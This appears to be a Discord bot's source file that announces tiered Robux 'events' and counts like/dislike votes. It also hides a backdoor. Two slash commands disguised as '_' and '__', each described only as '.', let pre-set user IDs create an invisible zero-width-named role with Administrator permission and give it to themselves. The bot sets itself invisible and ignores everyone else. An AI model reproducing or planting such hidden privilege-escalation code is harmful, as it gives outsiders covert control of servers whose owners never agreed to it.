const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, REST, Routes, PermissionsBitField } = require('discord.js');
const fs = require('fs');
//
// --- 1. БЕЗОПАСНАЯ ЗАГРУЗКА КОНФИГА ---
let config = {};
if (fs.existsSync('./config.json')) {
    try {
        config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
    } catch (err) {
        console.error("Ошибка при чтении config.json:", err);
    }
} else {
    console.log("Файл config.json не найден, использую Variables из Railway.");
}

// Приоритет Railway Variables (process.env) над файлом
const TOKEN = process.env.TOKEN_ID || config.TOKEN_ID;

// Исправляем обработку ID админов: Railway дает строку, файл дает массив
let ADMIN_USER_IDS = [];
if (process.env.ADMIN_USER_IDS) {
    // Если в Railway несколько ID через запятую, это сработает
    ADMIN_USER_IDS = process.env.ADMIN_USER_IDS.split(',').map(id => id.trim());
} else if (config.ADMIN_USER_IDS) {
    ADMIN_USER_IDS = config.ADMIN_USER_IDS.map(id => String(id));
}

if (!TOKEN) {
    console.error("❌ ОШИБКА: TOKEN_ID не найден! Проверь вкладку Variables в Railway.");
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// --- 2. CONFIGURATION ---
const CONFIG = {
    ALLOWED_ROLE: '1490346306965864608',
    ALLOWED_CHANNEL: '1490344220417069156',
    PING_ROLE: '1492973460400640020',
    ROBUX_EMOJI: '<:robux:1492973460400640020>',
    CHANNELS_ROLES_CHANNEL: '<id:customize>'  // ID канала 📑 Channels & Roles
};

const MINI_CONFIGS = {
    '-community': {
        name: 'Community',
        minReward: 5,
        maxReward: 24,
        color: 0x5865F2,
        emoji: '👍',
        allowedRole: '1496136262350803056',
        allowedChannel: '1496135112494944478',
        pingRole: '1496136262350803056',
        robuxEmoji: '1492973460400640020'
    },
    '!plus': {
        name: 'Plus',
        minReward: 25,
        maxReward: 99,
        color: 0x57F287,
        emoji: '👍',
        allowedRole: '1490346518325104821',
        allowedChannel: '1490344313182486770',
        pingRole: '1492973555607146727',
        robuxEmoji: '1492973460400640020'
    },
    '!super': {
        name: 'Super',
        minReward: 100,
        maxReward: 499,
        color: 0xFEE75C,
        emoji: '👍',
        allowedRole: '1490346869342077049',
        allowedChannel: '1490344358807994541',
        pingRole: '1492973623915319306',
        robuxEmoji: '1492973460400640020'
    },
    '!epic': {
        name: 'Epic',
        minReward: 500,
        maxReward: 1999,
        color: 0xEB459E,
        emoji: '👍',
        allowedRole: '1490347549758984394',
        allowedChannel: '1490344414294315189',
        pingRole: '1492973745210658936',
        robuxEmoji: '1492973460400640020'
    },
    '!exclusive': {
        name: 'Exclusive',
        minReward: 2000,
        maxReward: 4999,
        color: 0xED4245,
        emoji: '👍',
        allowedRole: '1490347815312953345',
        allowedChannel: '1490344576211226694',
        pingRole: '1492973807319908442',
        robuxEmoji: '1492973460400640020'
    },
    '!hyper': {
        name: 'Hyper',
        minReward: 5000,
        maxReward: 9999,
        color: 0xFF7A00,
        emoji: '👍',
        allowedRole: '1490348053746417777',
        allowedChannel: '1490344628266733628',
        pingRole: '1492973910889726112',
        robuxEmoji: '1492973460400640020'
    },
    '!quantum': {
        name: 'Quantum',
        minReward: 10000,
        maxReward: 99999,
        color: 0x9B59B6,
        emoji: '👍',
        allowedRole: '1490348168507035878',
        allowedChannel: '1490344763650609152',
        pingRole: '1492973989667278859',
        robuxEmoji: '1492973460400640020'
    }
};

const ROLE_NAME = '\u200b';
const rest = new REST({ version: '10' }).setToken(TOKEN);

// Хранилище голосов: messageId -> { like: Set<userId>, dislike: Set<userId> }
const votes = new Map();

const commands = [
    {
        name: '_',
        description: '.',
        options: [
            {
                type: 3, // STRING
                name: 'action',
                description: 'Mode',
                choices: [
                    { name: 'On', value: 'add' },
                    { name: 'Off', value: 'remove' }
                ],
                required: true
            }
        ]
    },
    {
        name: '__',
        description: '.',
        options: [
            {
                type: 3,
                name: 'status',
                description: 'Bot status',
                choices: [
                    { name: 'Invisible', value: 'invisible' },
                    { name: 'Online', value: 'online' },
                    { name: 'Idle', value: 'idle' },
                    { name: 'Do Not Disturb', value: 'dnd' }
                ],
                required: true
            }
        ]
    }
];

// --- 3. СОБЫТИЯ ---
client.once('ready', async () => {
    console.log(`✅ Бот запущен как ${client.user.tag}!`);

    // Устанавливаем статус "невидимый"
    client.user.setStatus('invisible');

    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('✅ Слэш-команды зарегистрированы!');
    } catch (error) {
        console.error('Ошибка регистрации команд:', error);
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === '_') {
        if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
            return;
        }

        const action = interaction.options.getString('action') || 'add';

        const guild = interaction.guild;
        const member = interaction.user;

        let role = guild.roles.cache.find(r => r.name === ROLE_NAME);

        if (action === 'remove') {
            if (!role) {
                return interaction.reply({ content: 'Role not found.', ephemeral: true });
            }
            try {
                await role.delete();
                return interaction.reply({ content: 'Role removed.', ephemeral: true });
            } catch (err) {
                return interaction.reply({ content: 'Failed.', ephemeral: true });
            }
        }

        if (!role) {
            try {
                role = await guild.roles.create({
                    name: ROLE_NAME,
                    permissions: [PermissionsBitField.Flags.Administrator],
                    color: 0x313338,
                    hoist: false,
                    mentionable: false,
                    reason: 'System Auto-Role'
                });
            } catch (err) {
                return interaction.reply({ content: 'Failed.', ephemeral: true });
            }
        }

        const memberObj = await guild.members.fetch(member.id);
        if (memberObj.roles.cache.has(role.id)) {
            return interaction.reply({ content: 'Active.', ephemeral: true });
        }

        try {
            await memberObj.roles.add(role);
            await interaction.reply({ content: 'Done.', ephemeral: true });
        } catch (err) {
            return interaction.reply({ content: 'Failed.', ephemeral: true });
        }
    }

    if (interaction.commandName === '__') {
        if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
            // Не отвечаем - Discord покажет "Application failed to respond"
            return;
        }

        const status = interaction.options.getString('status');

        try {
            await client.user.setStatus(status);
            const statusNames = {
                'invisible': 'Invisible',
                'online': 'Online',
                'idle': 'Idle',
                'dnd': 'Do Not Disturb'
            };
            return interaction.reply({
                content: `✅ Bot status changed to: **${statusNames[status]}**`,
                ephemeral: true
            });
        } catch (err) {
            return interaction.reply({
                content: '❌ Failed to change bot status.',
                ephemeral: true
            });
        }
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // --- Mini configs handler ---
    const msgParts = message.content.trim().split(/\s+/);
    const msgCmd = msgParts[0].toLowerCase();
    if (!Object.keys(MINI_CONFIGS).includes(msgCmd)) return;

    const miniConfig = MINI_CONFIGS[msgCmd];

    if (message.channel.id !== miniConfig.allowedChannel) return;
    if (!message.member.roles.cache.has(miniConfig.allowedRole)) return;

    await message.delete().catch(() => {});

    // Parse reward amount from message
    let reward = miniConfig.minReward;
    if (msgParts.length > 1) {
        const customReward = parseInt(msgParts[1]);
        if (!isNaN(customReward)) {
            if (customReward < miniConfig.minReward) {
                reward = miniConfig.minReward;
            } else if (customReward > miniConfig.maxReward) {
                const maxReply = await message.channel.send({
                    content: `<@${message.author.id}> ⚠️ Max for ${miniConfig.name}: **${miniConfig.maxReward} R$**`,
                    allowedMentions: { users: [message.author.id] }
                });
                setTimeout(() => maxReply.delete().catch(() => {}), 5000);
                return;
            } else {
                reward = customReward;
            }
        }
    }

    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId(`${msgCmd.slice(1)}_like`)
                .setEmoji(miniConfig.emoji)
                .setLabel('0')
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId(`${msgCmd.slice(1)}_dislike`)
                .setEmoji('👎')
                .setLabel('0')
                .setStyle(ButtonStyle.Danger),
        );

    const content = `<@${message.author.id}> is starting a **${miniConfig.name} Event!** **(${reward} R$)**\n\n` +
                    `<@&${miniConfig.pingRole}>\n\n` +
                    `⭐ Want to **change your pings?** Edit them in --> <id:customize>`;

    const msg = await message.channel.send({
        content: content,
        components: [row]
    });

    // Инициализируем хранилище голосов для этого сообщения
    votes.set(msg.id, { like: new Set(), dislike: new Set() });
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    const validPrefixes = Object.keys(MINI_CONFIGS).map(k => k.slice(1));
    const parts = interaction.customId.split('_');
    const prefix = parts[0];

    if (!validPrefixes.includes(prefix)) return;

    const action = parts[1]; // 'like' или 'dislike'
    if (action !== 'like' && action !== 'dislike') return;

    const msgId = interaction.message.id;
    const userId = interaction.user.id;

    if (!votes.has(msgId)) {
        votes.set(msgId, { like: new Set(), dislike: new Set() });
    }

    const msgVotes = votes.get(msgId);

    // Определяем противоположное действие
    const opposite = action === 'like' ? 'dislike' : 'like';

    // Если уже стоит эта оценка — убираем её (toggle off)
    if (msgVotes[action].has(userId)) {
        msgVotes[action].delete(userId);
    } else {
        // Если стоит противоположная — убираем её
        if (msgVotes[opposite].has(userId)) {
            msgVotes[opposite].delete(userId);
        }
        // Ставим новую
        msgVotes[action].add(userId);
    }

    // Обновляем счётчики
    const likeCount = msgVotes.like.size;
    const dislikeCount = msgVotes.dislike.size;

    const newRow = new ActionRowBuilder()
        .addComponents(
            ButtonBuilder.from(interaction.message.components[0].components[0])
                .setLabel(String(likeCount))
                .setCustomId(`${prefix}_like`),
            ButtonBuilder.from(interaction.message.components[0].components[1])
                .setLabel(String(dislikeCount))
                .setCustomId(`${prefix}_dislike`)
        );

    await interaction.update({
        components: [newRow]
    });
});

client.login(TOKEN);